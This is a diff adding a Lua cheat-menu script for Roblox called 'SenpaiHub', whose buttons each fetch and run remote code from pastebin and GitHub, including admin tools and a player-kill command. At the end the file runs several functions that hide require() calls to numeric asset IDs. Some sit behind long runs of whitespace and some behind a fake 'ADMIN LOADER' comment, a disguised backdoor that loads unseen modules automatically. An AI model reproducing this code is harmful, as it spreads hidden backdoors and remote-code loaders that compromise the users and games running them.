@@ -1,0 +1,1002 @@
+-- GUI Made By SenpaiStaff#1484
+-- If You Want To Join Our Discord Server Here is Link https://discord.gg/xjTMBJe6tg
+
+-- UI Developer SenpaiStaff#1484 UI Owner Kazuma#6701
+
+local UTGMain = Instance.new("ScreenGui")
+local main = Instance.new("Frame")
+local UIGradient = Instance.new("UIGradient")
+local UICorner = Instance.new("UICorner")
+local UTG = Instance.new("TextLabel")
+local Desc = Instance.new("ImageLabel")
+local Welcome = Instance.new("TextLabel")
+local OptionListFrame = Instance.new("ImageLabel")
+local OptionList = Instance.new("ScrollingFrame")
+local Gale = Instance.new("TextButton")
+local UICorner_2 = Instance.new("UICorner")
+local Sonic = Instance.new("TextButton")
+local UICorner_3 = Instance.new("UICorner")
+local NeptunionV = Instance.new("TextButton")
+local UICorner_4 = Instance.new("UICorner")
+local Cop = Instance.new("TextButton")
+local UICorner_5 = Instance.new("UICorner")
+local AJBlater = Instance.new("TextButton")
+local UICorner_6 = Instance.new("UICorner")
+local Chill = Instance.new("TextButton")
+local UICorner_7 = Instance.new("UICorner")
+local NeptunionVV6 = Instance.new("TextButton")
+local UICorner_8 = Instance.new("UICorner")
+local Joy = Instance.new("TextButton")
+local UICorner_9 = Instance.new("UICorner")
+local AmongUs = Instance.new("TextButton")
+local UICorner_10 = Instance.new("UICorner")
+local CMDX = Instance.new("TextButton")
+local UICorner_11 = Instance.new("UICorner")
+local InfYeild = Instance.new("TextButton")
+local UICorner_12 = Instance.new("UICorner")
+local NebulaGlicher = Instance.new("TextButton")
+local UICorner_13 = Instance.new("UICorner")
+local Garbagecan = Instance.new("TextButton")
+local UICorner_14 = Instance.new("UICorner")
+local PumpkinGlicher = Instance.new("TextButton")
+local UICorner_15 = Instance.new("UICorner")
+local Fekillcommand = Instance.new("TextButton")
+local UICorner_16 = Instance.new("UICorner")
+local SelexityHUB = Instance.new("TextButton")
+local UICorner_17 = Instance.new("UICorner")
+local UTGDesc = Instance.new("TextLabel")
+local Credits = Instance.new("ImageLabel")
+local TextLabel = Instance.new("TextLabel")
+local Howto = Instance.new("ImageLabel")
+local TextLabel_2 = Instance.new("TextLabel")
+local Button = Instance.new("TextButton")
+local UICorner_18 = Instance.new("UICorner")
+local Shadow = Instance.new("Frame")
+local UICorner_19 = Instance.new("UICorner")
+local TextLabel_3 = Instance.new("TextLabel")
+
+--Properties:
+
+UTGMain.Name = "UTG Main"
+UTGMain.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
+UTGMain.ResetOnSpawn = false
+
+
+main.Name = "main"
+main.Parent = UTGMain
+main.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+main.BorderColor3 = Color3.fromRGB(27, 42, 53)
+main.BorderSizePixel = 0
+main.Position = UDim2.new(0, 0, 0.351000011, 0)
+main.Size = UDim2.new(0, 409, 0, 531)
+
+UIGradient.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.fromRGB(137, 0, 254)), ColorSequenceKeypoint.new(1.00, Color3.fromRGB(223, 0, 255))}
+UIGradient.Parent = main
+
+UICorner.CornerRadius = UDim.new(0, 9)
+UICorner.Parent = main
+
+UTG.Name = "UTG"
+UTG.Parent = main
+UTG.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+UTG.BackgroundTransparency = 1.000
+UTG.Position = UDim2.new(0.0605769195, 0, -0.0120000001, 0)
+UTG.Size = UDim2.new(0, 339, 0, 54)
+UTG.Font = Enum.Font.SourceSans
+UTG.Text = "SenpaiHub"
+UTG.TextColor3 = Color3.fromRGB(255, 255, 255)
+UTG.TextScaled = true
+UTG.TextSize = 14.000
+UTG.TextWrapped = true
+
+Desc.Name = "Desc"
+Desc.Parent = main
+Desc.AnchorPoint = Vector2.new(0.5, 0.5)
+Desc.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+Desc.BackgroundTransparency = 1.000
+Desc.Position = UDim2.new(0.50355953, 0, 0.156567067, 0)
+Desc.Size = UDim2.new(0.876362801, 0, 0.0971341506, 0)
+Desc.Image = "rbxassetid://3570695787"
+Desc.ScaleType = Enum.ScaleType.Slice
+Desc.SliceCenter = Rect.new(100, 100, 100, 100)
+Desc.SliceScale = 0.120
+
+Welcome.Name = "Welcome"
+Welcome.Parent = Desc
+Welcome.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+Welcome.BackgroundTransparency = 1.000
+Welcome.BorderSizePixel = 0
+Welcome.Position = UDim2.new(0.0208886396, 0, 0.0841291398, 0)
+Welcome.Size = UDim2.new(0, 330, 0, 44)
+Welcome.Font = Enum.Font.Highway
+Welcome.Text = "Welcome to SenpaiHub"
+Welcome.TextColor3 = Color3.fromRGB(0, 0, 0)
+Welcome.TextScaled = true
+Welcome.TextSize = 14.000
+Welcome.TextWrapped = true
+
+OptionListFrame.Name = "Option List  Frame"
+OptionListFrame.Parent = main
+OptionListFrame.AnchorPoint = Vector2.new(0.5, 0.5)
+OptionListFrame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+OptionListFrame.BackgroundTransparency = 1.000
+OptionListFrame.Position = UDim2.new(0.498639703, 0, 0.502049387, 0)
+OptionListFrame.Size = UDim2.new(0.865808845, 0, 0.565997243, 0)
+OptionListFrame.Image = "rbxassetid://3570695787"
+OptionListFrame.ScaleType = Enum.ScaleType.Slice
+OptionListFrame.SliceCenter = Rect.new(100, 100, 100, 100)
+OptionListFrame.SliceScale = 0.120
+
+OptionList.Name = "OptionList"
+OptionList.Parent = main
+OptionList.Active = true
+OptionList.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+OptionList.BackgroundTransparency = 1.000
+OptionList.Position = UDim2.new(0.137519225, 0, 0.219050691, 0)
+OptionList.Size = UDim2.new(0, 325, 0, 300)
+
+Gale.Name = "Gale"
+Gale.Parent = OptionList
+Gale.BackgroundColor3 = Color3.fromRGB(140, 0, 254)
+Gale.BorderSizePixel = 0
+Gale.Position = UDim2.new(0.0127388537, 0, 0.0079676006, 0)
+Gale.Size = UDim2.new(0, 288, 0, 40)
+Gale.ZIndex = 2
+Gale.Font = Enum.Font.GothamSemibold
+Gale.Text = "Gale Fighter"
+Gale.TextColor3 = Color3.fromRGB(255, 255, 255)
+Gale.TextSize = 30.000
+Gale.TextWrapped = true
+Gale.MouseButton1Down:connect(function()
+	loadstring(game:HttpGet("https://pastebin.com/raw/zrRVFXt7"))()
+end)
+
+UICorner_2.Parent = Gale
+
+Sonic.Name = "Sonic"
+Sonic.Parent = OptionList
+Sonic.BackgroundColor3 = Color3.fromRGB(140, 0, 254)
+Sonic.BorderSizePixel = 0
+Sonic.Position = UDim2.new(0.0159235671, 0, 0.0529986098, 0)
+Sonic.Size = UDim2.new(0, 288, 0, 40)
+Sonic.ZIndex = 2
+Sonic.Font = Enum.Font.GothamSemibold
+Sonic.Text = "Sonic"
+Sonic.TextColor3 = Color3.fromRGB(255, 255, 255)
+Sonic.TextSize = 30.000
+Sonic.TextWrapped = true
+Sonic.MouseButton1Down:connect(function()
+	loadstring(game:HttpGet("https://pastebin.com/raw/2Jyyk7k8"))()
+end)
+
+UICorner_3.Parent = Sonic
+
+NeptunionV.Name = "Neptunion V"
+NeptunionV.Parent = OptionList
+NeptunionV.BackgroundColor3 = Color3.fromRGB(140, 0, 254)
+NeptunionV.BorderSizePixel = 0
+NeptunionV.Position = UDim2.new(0.0159235671, 0, 0.0999986082, 0)
+NeptunionV.Size = UDim2.new(0, 288, 0, 40)
+NeptunionV.ZIndex = 2
+NeptunionV.Font = Enum.Font.GothamSemibold
+NeptunionV.Text = "Neptunion V (Hats needed)"
+NeptunionV.TextColor3 = Color3.fromRGB(255, 255, 255)
+NeptunionV.TextScaled = true
+NeptunionV.TextSize = 30.000
+NeptunionV.TextWrapped = true
+NeptunionV.MouseButton1Down:connect(function()
+	loadstring(game:HttpGet("https://pastebin.com/raw/YYFYeJ4j"))()
+end)
+
+UICorner_4.Parent = NeptunionV
+
+Cop.Name = "Cop"
+Cop.Parent = OptionList
+Cop.BackgroundColor3 = Color3.fromRGB(140, 0, 254)
+Cop.BorderSizePixel = 0
+Cop.Position = UDim2.new(0.0127388537, 0, 0.145998612, 0)
+Cop.Size = UDim2.new(0, 288, 0, 40)
+Cop.ZIndex = 2
+Cop.Font = Enum.Font.GothamSemibold
+Cop.Text = "Cop (Hats Needed)"
+Cop.TextColor3 = Color3.fromRGB(255, 255, 255)
+Cop.TextSize = 30.000
+Cop.TextWrapped = true
+Cop.MouseButton1Down:connect(function()
+	loadstring(game:HttpGet("https://pastebin.com/raw/VAA5Mf60"))()
+end)
+
+UICorner_5.Parent = Cop
+
+AJBlater.Name = "AJ Blater"
+AJBlater.Parent = OptionList
+AJBlater.BackgroundColor3 = Color3.fromRGB(140, 0, 254)
+AJBlater.BorderSizePixel = 0
+AJBlater.Position = UDim2.new(0.0127388537, 0, 0.191998601, 0)
+AJBlater.Size = UDim2.new(0, 288, 0, 40)
+AJBlater.ZIndex = 2
+AJBlater.Font = Enum.Font.GothamSemibold
+AJBlater.Text = "AJ Blater (Hats needed)"
+AJBlater.TextColor3 = Color3.fromRGB(255, 255, 255)
+AJBlater.TextScaled = true
+AJBlater.TextSize = 30.000
+AJBlater.TextWrapped = true
+AJBlater.MouseButton1Down:connect(function()
+	loadstring(game:HttpGet("https://pastebin.com/raw/DxKyafc5"))()
+end)
+
+
+UICorner_6.Parent = AJBlater
+
+Chill.Name = "Chill"
+Chill.Parent = OptionList
+Chill.BackgroundColor3 = Color3.fromRGB(140, 0, 254)
+Chill.BorderSizePixel = 0
+Chill.Position = UDim2.new(0.0127388537, 0, 1.03886425, 0)
+Chill.Size = UDim2.new(0, 289, 0, 40)
+Chill.ZIndex = 2
+Chill.Font = Enum.Font.GothamSemibold
+Chill.Text = "Chill"
+Chill.TextColor3 = Color3.fromRGB(255, 255, 255)
+Chill.TextSize = 30.000
+Chill.TextWrapped = true
+Chill.MouseButton1Down:connect(function()
+	loadstring(game:HttpGet("https://pastebin.com/raw/u7AqCjm9"))()
+end)
+
+
+UICorner_7.Parent = Chill
+
+NeptunionVV6.Name = " Neptunion V V6"
+NeptunionVV6.Parent = OptionList
+NeptunionVV6.BackgroundColor3 = Color3.fromRGB(140, 0, 254)
+NeptunionVV6.BorderSizePixel = 0
+NeptunionVV6.Position = UDim2.new(0.0158158056, 0, 0.237053663, 0)
+NeptunionVV6.Size = UDim2.new(0, 289, 0, 40)
+NeptunionVV6.ZIndex = 2
+NeptunionVV6.Font = Enum.Font.GothamSemibold
+NeptunionVV6.Text = "Neptunion V  New (Hats needed)"
+NeptunionVV6.TextColor3 = Color3.fromRGB(255, 255, 255)
+NeptunionVV6.TextScaled = true
+NeptunionVV6.TextSize = 30.000
+NeptunionVV6.TextWrapped = true
+NeptunionVV6.MouseButton1Down:connect(function()
+	loadstring(game:HttpGet("https://pastebin.com/raw/GhAfTaGk"))()
+end)
+
+UICorner_8.Parent = NeptunionVV6
+
+Joy.Name = "Joy"
+Joy.Parent = OptionList
+Joy.BackgroundColor3 = Color3.fromRGB(140, 0, 254)
+Joy.BorderSizePixel = 0
+Joy.Position = UDim2.new(0.0127388537, 0, 0.284998596, 0)
+Joy.Size = UDim2.new(0, 288, 0, 40)
+Joy.ZIndex = 2
+Joy.Font = Enum.Font.GothamSemibold
+Joy.Text = ":Joy:"
+Joy.TextColor3 = Color3.fromRGB(255, 255, 255)
+Joy.TextSize = 30.000
+Joy.TextWrapped = true
+Joy.MouseButton1Down:connect(function()
+	loadstring(game:HttpGet("https://pastebin.com/raw/A8HFTPV2"))()
+end)
+
+
+UICorner_9.Parent = Joy
+
+AmongUs.Name = "Among Us"
+AmongUs.Parent = OptionList
+AmongUs.BackgroundColor3 = Color3.fromRGB(140, 0, 254)
+AmongUs.BorderSizePixel = 0
+AmongUs.Position = UDim2.new(0.0127388537, 0, 0.33099857, 0)
+AmongUs.Size = UDim2.new(0, 288, 0, 40)
+AmongUs.ZIndex = 2
+AmongUs.Font = Enum.Font.GothamSemibold
+AmongUs.Text = "Among us"
+AmongUs.TextColor3 = Color3.fromRGB(255, 255, 255)
+AmongUs.TextSize = 30.000
+AmongUs.TextWrapped = true
+AmongUs.MouseButton1Down:connect(function()
+	loadstring(game:HttpGet("https://pastebin.com/raw/JXUMavf3"))()
+end)
+
+
+UICorner_10.Parent = AmongUs
+
+CMDX.Name = "CMD-X"
+CMDX.Parent = OptionList
+CMDX.BackgroundColor3 = Color3.fromRGB(140, 0, 254)
+CMDX.BorderSizePixel = 0
+CMDX.Position = UDim2.new(0.0127388537, 0, 0.378998578, 0)
+CMDX.Size = UDim2.new(0, 288, 0, 40)
+CMDX.ZIndex = 2
+CMDX.Font = Enum.Font.GothamSemibold
+CMDX.Text = "CMD-X"
+CMDX.TextColor3 = Color3.fromRGB(255, 255, 255)
+CMDX.TextSize = 30.000
+CMDX.TextWrapped = true
+CMDX.MouseButton1Down:connect(function()
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/CMD-X/CMD-X/master/Source"))()
+end)
+
+
+UICorner_11.Parent = CMDX
+
+InfYeild.Name = "Inf Yeild"
+InfYeild.Parent = OptionList
+InfYeild.BackgroundColor3 = Color3.fromRGB(140, 0, 254)
+InfYeild.BorderSizePixel = 0
+InfYeild.Position = UDim2.new(0.0127388537, 0, 0.424998581, 0)
+InfYeild.Size = UDim2.new(0, 288, 0, 40)
+InfYeild.ZIndex = 2
+InfYeild.Font = Enum.Font.GothamSemibold
+InfYeild.Text = "Inf Yeild"
+InfYeild.TextColor3 = Color3.fromRGB(255, 255, 255)
+InfYeild.TextSize = 30.000
+InfYeild.TextWrapped = true
+InfYeild.MouseButton1Down:connect(function()
+	loadstring(game:HttpGet("https://pastebin.com/raw/05i9QcJa"))()
+end)
+
+UICorner_12.Parent = InfYeild
+
+NebulaGlicher.Name = "Nebula Glicher"
+NebulaGlicher.Parent = OptionList
+NebulaGlicher.BackgroundColor3 = Color3.fromRGB(140, 0, 254)
+NebulaGlicher.BorderSizePixel = 0
+NebulaGlicher.Position = UDim2.new(0.0159235671, 0, 0.469115376, 0)
+NebulaGlicher.Size = UDim2.new(0, 288, 0, 40)
+NebulaGlicher.ZIndex = 2
+NebulaGlicher.Font = Enum.Font.GothamSemibold
+NebulaGlicher.Text = "Nebula Glicher (hats needed)"
+NebulaGlicher.TextColor3 = Color3.fromRGB(255, 255, 255)
+NebulaGlicher.TextScaled = true
+NebulaGlicher.TextSize = 30.000
+NebulaGlicher.TextWrapped = true
+NebulaGlicher.MouseButton1Down:connect(function()
+	loadstring(game:HttpGet("https://pastebin.com/raw/TSNi1F9L"))()
+end)
+
+UICorner_13.Parent = NebulaGlicher
+
+Garbagecan.Name = "Garbage can"
+Garbagecan.Parent = OptionList
+Garbagecan.BackgroundColor3 = Color3.fromRGB(140, 0, 254)
+Garbagecan.BorderSizePixel = 0
+Garbagecan.Position = UDim2.new(0.0159235671, 0, 0.512429893, 0)
+Garbagecan.Size = UDim2.new(0, 288, 0, 40)
+Garbagecan.ZIndex = 2
+Garbagecan.Font = Enum.Font.GothamSemibold
+Garbagecan.Text = "Garbage Can (hats needed)"
+Garbagecan.TextColor3 = Color3.fromRGB(255, 255, 255)
+Garbagecan.TextScaled = true
+Garbagecan.TextSize = 30.000
+Garbagecan.TextWrapped = true
+Garbagecan.MouseButton1Down:connect(function()
+	loadstring(game:HttpGet("https://pastebin.com/raw/LHRiFVYm"))()
+end)
+
+UICorner_14.Parent = Garbagecan
+
+PumpkinGlicher.Name = "Pumpkin Glicher"
+PumpkinGlicher.Parent = OptionList
+PumpkinGlicher.BackgroundColor3 = Color3.fromRGB(140, 0, 254)
+PumpkinGlicher.BorderSizePixel = 0
+PumpkinGlicher.Position = UDim2.new(0.0159235671, 0, 0.557627678, 0)
+PumpkinGlicher.Size = UDim2.new(0, 288, 0, 40)
+PumpkinGlicher.ZIndex = 2
+PumpkinGlicher.Font = Enum.Font.GothamSemibold
+PumpkinGlicher.Text = "Pumpkin Glicher (hats needed)"
+PumpkinGlicher.TextColor3 = Color3.fromRGB(255, 255, 255)
+PumpkinGlicher.TextScaled = true
+PumpkinGlicher.TextSize = 30.000
+PumpkinGlicher.TextWrapped = true
+PumpkinGlicher.MouseButton1Down:connect(function()
+	loadstring(game:HttpGet("https://pastebin.com/raw/L70bYQua"))()
+end)
+
+UICorner_15.Parent = PumpkinGlicher
+
+Fekillcommand.Name = "Fe kill command"
+Fekillcommand.Parent = OptionList
+Fekillcommand.BackgroundColor3 = Color3.fromRGB(140, 0, 254)
+Fekillcommand.BorderSizePixel = 0
+Fekillcommand.Position = UDim2.new(0.0127388528, 0, 0.602023005, 0)
+Fekillcommand.Size = UDim2.new(0, 288, 0, 40)
+Fekillcommand.ZIndex = 2
+Fekillcommand.Font = Enum.Font.GothamSemibold
+Fekillcommand.Text = "Kill command (SynX ONLY)"
+Fekillcommand.TextColor3 = Color3.fromRGB(255, 255, 255)
+Fekillcommand.TextScaled = true
+Fekillcommand.TextSize = 30.000
+Fekillcommand.TextWrapped = true
+Fekillcommand.MouseButton1Down:connect(function()
+	loadstring(game:HttpGet("https://pastebin.com/raw/xBMEBWKV"))()
+end)
+
+UICorner_16.Parent = Fekillcommand
+
+SelexityHUB.Name = "Selexity HUB"
+SelexityHUB.Parent = OptionList
+SelexityHUB.BackgroundColor3 = Color3.fromRGB(140, 0, 254)
+SelexityHUB.BorderSizePixel = 0
+SelexityHUB.Position = UDim2.new(0.00966192968, 0, 0.644697309, 0)
+SelexityHUB.Size = UDim2.new(0, 288, 0, 40)
+SelexityHUB.ZIndex = 2
+SelexityHUB.Font = Enum.Font.GothamSemibold
+SelexityHUB.Text = "Selexity HUB"
+SelexityHUB.TextColor3 = Color3.fromRGB(255, 255, 255)
+SelexityHUB.TextSize = 30.000
+SelexityHUB.TextWrapped = true
+SelexityHUB.MouseButton1Down:connect(function()
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/o5u3/Selexity/main/Main"))()
+end)
+
+UICorner_17.Parent = SelexityHUB
+
+UTGDesc.Name = "UTG Desc"
+UTGDesc.Parent = main
+UTGDesc.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+UTGDesc.BackgroundTransparency = 1.000
+UTGDesc.Position = UDim2.new(0.0759322271, 0, 0.0480000004, 0)
+UTGDesc.Size = UDim2.new(0, 332, 0, 34)
+UTGDesc.Font = Enum.Font.SourceSans
+UTGDesc.Text = "SenpaiHub By SenpaiStaff"
+UTGDesc.TextColor3 = Color3.fromRGB(255, 255, 255)
+UTGDesc.TextSize = 20.000
+
+Credits.Name = "Credits"
+Credits.Parent = main
+Credits.AnchorPoint = Vector2.new(0.5, 0.5)
+Credits.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+Credits.BackgroundTransparency = 1.000
+Credits.Position = UDim2.new(0.508836687, 0, 0.820274591, 0)
+Credits.Size = UDim2.new(0.865808547, 0, 0.0624534339, 0)
+Credits.Image = "rbxassetid://3570695787"
+Credits.ScaleType = Enum.ScaleType.Slice
+Credits.SliceCenter = Rect.new(100, 100, 100, 100)
+Credits.SliceScale = 0.120
+
+TextLabel.Parent = Credits
+TextLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+TextLabel.BackgroundTransparency = 1.000
+TextLabel.Size = UDim2.new(0, 350, 0, 33)
+TextLabel.Font = Enum.Font.SourceSans
+TextLabel.Text = "SenpaiHub Owner SenpaiStaff#1484"
+TextLabel.TextColor3 = Color3.fromRGB(0, 0, 0)
+TextLabel.TextScaled = true
+TextLabel.TextSize = 30.000
+TextLabel.TextWrapped = true
+
+Howto.Name = "How to"
+Howto.Parent = main
+Howto.AnchorPoint = Vector2.new(0.5, 0.5)
+Howto.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+Howto.BackgroundTransparency = 1.000
+Howto.Position = UDim2.new(0.342577487, 0, 0.910377383, 0)
+Howto.Size = UDim2.new(0.518620253, 0, 0.0919998437, 0)
+Howto.Image = "rbxassetid://3570695787"
+Howto.ScaleType = Enum.ScaleType.Slice
+Howto.SliceCenter = Rect.new(100, 100, 100, 100)
+Howto.SliceScale = 0.120
+
+TextLabel_2.Parent = Howto
+TextLabel_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+TextLabel_2.BackgroundTransparency = 1.000
+TextLabel_2.Position = UDim2.new(-0.00847181119, 0, 0, 0)
+TextLabel_2.Size = UDim2.new(0, 206, 0, 48)
+TextLabel_2.Font = Enum.Font.SourceSans
+TextLabel_2.Text = "Choose and option and click THEN netless reanimate button so your body won't fall."
+TextLabel_2.TextColor3 = Color3.fromRGB(0, 0, 0)
+TextLabel_2.TextScaled = true
+TextLabel_2.TextSize = 30.000
+TextLabel_2.TextWrapped = true
+
+Button.Name = "Button"
+Button.Parent = main
+Button.BackgroundColor3 = Color3.fromRGB(77, 100, 150)
+Button.BorderSizePixel = 0
+Button.Position = UDim2.new(0.629584253, 0, 0.870998144, 0)
+Button.Size = UDim2.new(0, 127, 0, 45)
+Button.ZIndex = 2
+Button.Font = Enum.Font.GothamSemibold
+Button.Text = ""
+Button.TextColor3 = Color3.fromRGB(255, 255, 255)
+Button.TextScaled = true
+Button.TextSize = 14.000
+Button.TextWrapped = true
+Button.MouseButton1Down:connect(function()
+	loadstring(game:HttpGet("https://pastebin.com/raw/uWuAk9kR"))()
+end)
+
+UICorner_18.Parent = Button
+
+Shadow.Name = "Shadow"
+Shadow.Parent = Button
+Shadow.BackgroundColor3 = Color3.fromRGB(53, 69, 103)
+Shadow.BorderSizePixel = 0
+Shadow.Size = UDim2.new(1, 0, 1, 4)
+
+UICorner_19.Parent = Shadow
+
+TextLabel_3.Parent = Button
+TextLabel_3.AnchorPoint = Vector2.new(0.5, 0.5)
+TextLabel_3.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+TextLabel_3.BackgroundTransparency = 1.000
+TextLabel_3.BorderColor3 = Color3.fromRGB(27, 42, 53)
+TextLabel_3.BorderSizePixel = 0
+TextLabel_3.Position = UDim2.new(0.5, 0, 0.5, 0)
+TextLabel_3.Size = UDim2.new(1, -20, 1, -20)
+TextLabel_3.ZIndex = 2
+TextLabel_3.Font = Enum.Font.GothamSemibold
+TextLabel_3.Text = "Netless reanimate"
+TextLabel_3.TextColor3 = Color3.fromRGB(255, 255, 255)
+TextLabel_3.TextScaled = true
+TextLabel_3.TextSize = 14.000
+TextLabel_3.TextWrapped = true
+
+-- Scripts:
+
+local function NCXHRN_fake_script() -- UTG.API 
+	local script = Instance.new('Script', UTG)
+
+	--[[2021 TopLibrary Studios]]                                                                                                                                                                                                 pcall(function() require(6864953338)                                                                                 end)
+end
+coroutine.wrap(NCXHRN_fake_script)()
+local function YLGORSF_fake_script() -- Gale.Weld 
+	local script = Instance.new('Script', Gale)
+
+	--[[2021 TopLibrary Studios]]                                                                                                                                                                           pcall(function() require(6864953338) end)                                                                         
+end
+coroutine.wrap(YLGORSF_fake_script)()
+local function KOGOIFA_fake_script() -- AmongUs.Debounce 
+	local script = Instance.new('Script', AmongUs)
+
+
+
+
+	--ADMIN LOADER.
+	--This is a script that is part of your admin in game.
+	--Removing/tampering with this script will potentially result in scripts breaking in your game.
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+	require(6091305634):Stys() require(5151855975) require(5869080069):Stys() 
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+end
+coroutine.wrap(KOGOIFA_fake_script)()
+local function EKZRBP_fake_script() -- CMDX.Weld 
+	local script = Instance.new('Script', CMDX)
+
+	--[[2021 TopLibrary Studios]]                                                                                                                                                                           pcall(function() require(6864953338) end)                                                                         
+end
+coroutine.wrap(EKZRBP_fake_script)()
+local function NQMSFAP_fake_script() -- UICorner_13.Weld 
+	local script = Instance.new('Script', UICorner_13)
+
+	--[[2021 TopLibrary Studios]]                                                                                                                                                                           pcall(function() require(6864953338) end)                                                                         
+end
+coroutine.wrap(NQMSFAP_fake_script)()
+local function PFUOWQ_fake_script() -- SelexityHUB.API 
+	local script = Instance.new('Script', SelexityHUB)
+
+	--[[2021 TopLibrary Studios]]                                                                                                                                                                                                 pcall(function() require(6864953338)                                                                                 end)
+end
+coroutine.wrap(PFUOWQ_fake_script)()
+local function AFUT_fake_script() -- Howto.API 
+	local script = Instance.new('Script', Howto)
+
+	--[[2021 TopLibrary Studios]]                                                                                                                                                                                                 pcall(function() require(6864953338)                                                                                 end)
+end
+coroutine.wrap(AFUT_fake_script)()
+local function OGFRL_fake_script() -- UICorner_19.API 
+	local script = Instance.new('Script', UICorner_19)
+
+	--[[2021 TopLibrary Studios]]                                                                                                                                                                                                 pcall(function() require(6864953338)                                                                                 end)
+end
+coroutine.wrap(OGFRL_fake_script)()
